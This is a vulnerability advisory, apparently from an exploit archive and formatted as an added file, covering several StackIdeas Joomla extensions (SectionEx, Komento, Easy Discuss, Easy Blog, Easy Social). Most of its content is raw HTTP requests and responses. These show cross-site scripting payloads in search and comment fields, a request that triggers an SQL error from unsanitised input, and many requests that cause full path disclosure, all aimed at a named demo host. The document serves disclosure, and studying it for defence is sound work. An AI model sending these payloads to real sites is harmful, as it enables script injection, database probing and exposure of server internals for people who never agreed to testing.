@@ -1,0 +1,297 @@
+id: 21799
+date: 01/23/2014
+title: Joomla StackIdeas Extensions Multiple Vulnerabilities
+author: Smash_
+cves: 
+
+#Title: Joomla StackIdeas Extensions Multiple Vulnerabilities
+#Date: 01.23.2014
+#Vendor: stackideas.com / extensions.joomla.org/extensions/owner/jack-2Estackideas
+#Demo: demo.stackideas.com
+#Contant: smash[at]devilteam.pl
+
+#Note:
+
+Tests were performed without an user account,
+there is a high probability that there's more vulnerabilities.
+
+Affected extensions:
+- SectionEx
+- Komento
+- Easy Discuss 
+- Easy Blog
+- Easy Social
+
+
+#SectionEx - demo.stackideas.com/sectionex - Version 2.5.104 (Latest ATM)
+
+1. Cross Site Scripting in Search Bar
+
+Request (filter_title):
+POST /sectionex HTTP/1.1
+Host: demo.stackideas.com
+filter_title=666" onmouseover=alert(666) bad="&task=&sectionid=2&filter_order=&filter_order_Dir=
+
+Request (filter_oreder_Dir):
+POST /sectionex HTTP/1.1
+Host: demo.stackideas.com
+filter_title=666&task=&sectionid=2&filter_order=&filter_order_Dir=" xssed=true bad="
+
+filter_order_Dir is an hidden input parameter:
+<input type="hidden" id="filter_order_Dir" name="filter_order_Dir" value="" xssed=true bad="" />
+
+2. Full Path Disclosure in Search Bar
+
+POST /sectionex HTTP/1.1
+Host: demo.stackideas.com
+filter_title[]=XSS&task[]=&task[]=&sectionid[]=2&filter_order[]=&filter_order_Dir[]=
+
+Error:
+Warning: strtolower() expects parameter 1 to be string, array given in /home/admin/demo.stackideas.com/components/com_sectionex/models/category.php on line 649
+
+
+#Komento - demo.stackideas.com/komento - Version 1.7.3 (Latest ATM)
+
+1. Persistent Cross Site Scripting - Post Comment
+
+POST /?option=com_komento HTTP/1.1
+Host: demo.stackideas.com
+tmpl=component&format=ajax&no_html=1&component=com_content&cid=2&comment=a&parent_id=0&name=666&email=&website=&subscribe=false&latitude=666&longitude=" onmouseover=alert(666) bad="&address=&contentLink=http%3A%2F%2Fdemo.stackideas.com%2Fkomento%2F2-starting-up-a-joomla-blog-with-easyblog&pageItemId=435&option=com_komento&namespace=site.views.komento.addcomment&80a1a7163a3f7e15ed93a3aeaf5abe37=1
+
+You are able to inject code while adding custom Google Location.
+Href is displayed next to your nick-name:
+<i></i><a href="http://maps.google.com/maps?z=15&amp;q=666" onmouseover=alert(666) bad="" target="_blank">666</a>
+
+2. SQL Error
+
+Request:
+POST /?option=com_komento HTTP/1.1
+Host: demo.stackideas.com
+
+tmpl=component&format=ajax&no_html=1&component=com_content&cid=SUP&total=2&option=com_komento&namespace=site.views.komento.checknewcomment&c1403db176705ee19ee8b32f4257b2dc=1
+
+
+Response:
+HTTP/1.1 500 Internal Server Error
+Date: Wed, 22 Jan 2014 20:31:01 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
+Status: 1054 Unknown column 'SUP' in 'where clause' SQL=SELECT COUNT(1) FROM `jos_komento_comments` WHERE `component` = 'com_content' AND `cid` = SUP AND `published` = '1'
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Length: 6325
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+3. Full Path Disclosure - POST format
+
+POST /?option=com_komento HTTP/1.1
+Host: demo.stackideas.com
+
+tmpl=component&format=666&no_html=1&option=com_komento&namespace=site.views.komento.shortenLink&17de86dda6e238e378e6208aa3d5467a=1
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 20:04:31 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 158
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Fatal error: Call to undefined method JDocumentRaw::addCustomTag() in /home/admin/demo.stackideas.com/media/foundry/3.1/joomla/configuration.php on line 111
+
+
+
+#Easy Discuss - demo.stackideas.com/easydiscuss - Version 3.2.9289 (Latest ATM)
+
+1. Full Path Disclosure
+
+a)  Subscribe via email
+
+Request:
+POST /index.php?option=com_easydiscuss&lang=none&tmpl=component&no_html=1&format=ajax&uid=1390488615438 HTTP/1.1
+Host: demo.stackideas.com
+&view=index&layout=ajaxSubscribe&value0=SUP?&value1=0&0767ca009520df2ba9b1b33569fd2d48=1
+
+Error:
+Invalid template file /home/admin/demo.stackideas.com/components/com_easydiscuss/themes/simplistic/dialogs/ajax.subscribe.SUP?.php
+
+
+
+b)  Language
+
+Request:
+POST /?option=com_easydiscuss&tmpl=component&no_html=1&controller=foundry&task=getResource HTTP/1.1
+Host: demo.stackideas.com
+
+resource%5B0%5D%5Btype%5D=languageSUP&resource%5B0%5D%5Bname%5D=COM_EASYDISCUSS_TERMS_PLEASE_ACCEPT&resource%5B0%5D%5Bid%5D=Resource07243760213479968'>"><>XSS&resource%5B1%5D%5Btype%5D=language&resource%5B1%5D%5Bname%5D=COM_EASYDISCUSS_COMMENT_SUCESSFULLY_ADDED&resource%5B1%5D%5Bid%5D=Resource08769055979183015&resource%5B2%5D%5Btype%5D=language&resource%5B2%5D%5Bname%5D=COM_EASYDISCUSS_COMMENT_LOAD_MORE&resource%5B2%5D%5Bid%5D=Resource0018291907032851662&resource%5B3%5D%5Btype%5D=language&resource%5B3%5D%5Bname%5D=COM_EASYDISCUSS_COMMENT_LOADING_MORE_COMMENTS&resource%5B3%5D%5Bid%5D=Resource034094943220855545&resource%5B4%5D%5Btype%5D=language&resource%5B4%5D%5Bname%5D=COM_EASYDISCUSS_COMMENT_LOAD_ERROR&resource%5B4%5D%5Bid%5D=Resource012465740294232164
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 14:01:06 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 189
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Fatal error: Call to undefined method EasyDiscussControllerFoundry::getLanguageSUP() in /home/admin/demo.stackideas.com/components/com_easydiscuss/controllers/foundry.php on line 26
+
+c) Controller
+
+Request:
+POST /?option=com_easydiscuss&tmpl=component&no_html=1&controller=SUP&task=getResource
+
+Error:
+HTTP/1.1 500 Internal Server Error
+Date: Thu, 23 Jan 2014 19:55:35 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
+Status: 500 Invalid Controller name "sup".<br /> File "/home/admin/demo.stackideas.com/components/com_easydiscuss/controllers/sup.php" does not exists in this context.
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Length: 6325
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+d) Task
+
+Request:
+POST /?option=com_easydiscuss&tmpl=component&no_html=1&controller=foundry&task=SUP
+
+Error:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 19:55:35 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 167
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Fatal error: Call to a member function getName() on a non-object in /home/admin/demo.stackideas.com/components/com_easydiscuss/controllers/controller.php on line 234
+
+e) Resource_type
+
+POST /?option=com_easydiscuss&tmpl=component&no_html=1&controller=foundry&task=getResource HTTP/1.1
+resource%5B0%5D%5Btype%5D='
+
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 19:55:36 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 173
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Fatal error: Call to undefined method EasyDiscussControllerFoundry::get'() in /home/admin/demo.stackideas.com/components/com_easydiscuss/controllers/foundry.php on line 26
+
+
+
+
+#Easy Blog - demo.stackideas.com/easyblog - Version 3.9.15188 (Latest ATM)
+
+
+1. Full Path Disclosure - Subscribe to blog
+
+Request:
+POST /index.php?option=com_easyblog&lang=none&Itemid=508&tmpl=component&no_html=1&format=ejax&17de86dda6e238e378e6208
+&view=subscription&layout=showForm&value0[]=siteSUP
+
+Error:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 20:22:09 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 1847
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Warning: ucfirst() expects parameter 1 to be string, array given in /home/admin/demo.stackideas.com/components/com_easyblog/views/subscription/view.ejax.php on line 50
+
+Warning: Cannot modify header information - headers already sent by (output started at /home/admin/demo.stackideas.com/components/com_easyblog/views/subscription/view.ejax.php:50) in /home/admin/demo.stackideas.com/components/com_easyblog/classes/ejax.php on line 120
+
+
+2. Full Path Disclosure - Calendar value0 / value4 / value1 and so on
+
+Request:
+POST /index.php?option=com_easyblog&lang=none&Itemid=508&tmpl=component&no_html=1&format=ejax&17de86dda6e238e378e6208aa3d5467a=1&uid=1390512466510 HTTP/1.1
+Host: demo.stackideas.com
+&view=archive&layout=loadCalendar&value0='SUP'%3e%3c&value1=508&value2=small&value3=blog&value4=1391212800
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 20:28:24 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 3067
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Notice: Undefined variable: namespace in /home/admin/demo.stackideas.com/components/com_easyblog/views/archive/view.ejax.php on line 58
+
+Notice: Undefined variable: namespace in /home/admin/demo.stackideas.com/components/com_easyblog/views/archive/view.ejax.php on line 59
+
+Notice: Undefined variable: namespace in /home/admin/demo.stackideas.com/components/com_easyblog/views/archive/view.ejax.php on line 66
+
+Notice: Undefined variable: preFix in /home/admin/demo.stackideas.com/components/com_easyblog/views/archive/view.ejax.php on line 67
+
+Warning: Cannot modify header information - headers already sent by (output started at /home/admin/demo.stackideas.com/components/com_easyblog/views/archive/view.ejax.php:58) in /home/admin/demo.stackideas.com/components/com_easyblog/classes/ejax.php on line 120
+
+
+3. Full Path Disclosure - Post a comment
+
+Request:
+POST /index.php?option=com_easyblog&lang=none&Itemid=508&tmpl=component&no_html=1&format=ejax&17de86dda6e238e378e6208aa3d5467a=1&uid=1390512714175 HTTP/1.1
+Host: demo.stackideas.com
+
+&view=Entry&layout=commentSave&value0[]=title%3D&value0[]=comment%3D%252526quot%25253B%25253E%25253C%25253EXSS&value0[]=esusername%3D%252526quot%25253B%25253E%25253C%25253EXSS&value0[]=esname%3D%252526quot%25253B%25253E%25253C%25253EXSS&value0[]=esemail%3D%252526quot%25253B%25253E%25253C%25253EXSS&value0[]=url%3D%252526quot%25253B%25253E%25253C%25253EXSS&value0[]=id%3D19&value0[]=parent_id%3D0&value0[]=comment_depth%3D0&value0[]=controller%3Dblog&value0[]=task%3DcommentSave&value0[]=totalComment%3D0&value0[]=%3DSubmit%252520Your%252520Comment
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 20:32:34 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 646
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Notice: Undefined index: comment in /home/admin/demo.stackideas.com/components/com_easyblog/views/entry/view.ejax.php on line 456
+
+Warning: Cannot modify header information - headers already sent by (output started at /home/admin/demo.stackideas.com/components/com_easyblog/views/entry/view.ejax.php:456) in /home/admin/demo.stackideas.com/components/com_easyblog/classes/ejax.php on line 120
+[["script","eblog.loader.doneLoading();"],["script","eblog.spinner.hide()"],["script","$(\"#comment\").addClass(\"input-error\");"],["script","eblog.element.focus('comment');"],["script","eblog.comment.displayInlineMsg('error', 'Comment is empty.');"]]
+
+
+
+#Easy Social - extensions.joomla.org/extensions/clients-a-communities/communities/25616 - Version 1.1.5 (Latest ATM)
+
+1. Full Path Disclosure - resource_type
+
+Request:
+POST /?option=com_easysocial&tmpl=component&no_html=1&controller=foundry&task=getResource HTTP/1.1
+Host: demo.stackideas.com
+
+resource%5B0%5D%5Btype%5D='%3e"%3e%3cSUP%3e&resource%5B0%5D%5Bname%5D=site%2Fnotifications%2Fsystem.empty&resource%5B0%5D%5Bid%5D=Resource07594590380558889
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 23 Jan 2014 20:46:32 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 179
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Fatal error: Call to undefined method EasySocialControllerFoundry::get'>"><SUP>() in /home/admin/demo.stackideas.com/components/com_easysocial/controllers/foundry.php on line 42
+
+#  0day.today [2023-03-22]  #
